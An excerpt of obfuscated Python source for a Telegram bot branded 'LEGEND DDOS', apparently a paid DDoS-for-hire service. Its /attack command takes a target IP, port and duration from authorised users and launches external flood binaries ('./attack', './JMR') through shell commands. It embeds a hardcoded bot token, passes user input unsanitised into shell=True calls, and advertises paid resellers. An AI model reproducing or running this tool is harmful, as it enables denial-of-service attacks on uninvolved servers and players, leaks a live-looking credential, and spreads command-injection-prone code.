...
import os #line:5
import time #line:6
bot =telebot .TeleBot ('7365764242:AAGLACT_hxmaIKGgiP6yXISS4syl0Wrjd3s')#line:9
ADMIN_IDS ={"6938861495"}#line:12
...
@bot .message_handler (commands =['attack'])#line:132
def handle_bgmi (O0O0O000O0O0OOO0O ):#line:133
    ...
    if OO0OOO0O0O0O000OO in allowed_user_ids :#line:135
        if OO0OOO0O0O0O000OO not in ADMIN_IDS and OO0OOO0O0O0O000OO in bgmi_cooldown and (datetime .datetime .now ()-bgmi_cooldown [OO0OOO0O0O0O000OO ]).seconds <COOLDOWN_TIME :#line:136
            bot .reply_to (O0O0O000O0O0OOO0O ,"You are on cooldown. Please wait 5 minutes before running the /attack command again.")#line:137
            return #line:138
        ...
        if len (OOOOO0O000OOO0O0O )==4 :#line:141
            ...
            if O0OO0OOOO00O00O0O >240 :#line:143
                ...
                subprocess .run (f"./attack {O0O0000O0OOO000OO} {OOOOOO000O0OOOOOO} {O0OO0OOOO00O00O0O} 200",shell =True )#line:150
                time .sleep (5 )#line:151
                subprocess .run (f"./JMR {O0O0000O0OOO000OO} {OOOOOO000O0OOOOOO} {O0OO0OOOO00O00O0O} 200",shell =True )#line:152
                return #line:153
        else :#line:154
            O0O00O0OO00OO0OO0 ="✅ Usage :- /attack <target> <port> <time>"#line:155
    else :#line:156
...
Buy From :- @paidhacksonlydm @paidhacksonlydm
Official Channel :- https://t.me/LegendPaidMod'''#line:189
...
def welcome_start (O0OOOO00O00O0OO00 ):#line:194
    OOOO0O0O0O0000O0O =f"👋🏻Welcome to LEGEND DDOS, {O0OOOO00O00O0OO00.from_user.first_name}! Feel Free to Explore.\n🤖Try To Run This Command : /help \n✅Join :- https://t.me/LegendPaidMod"#line:195
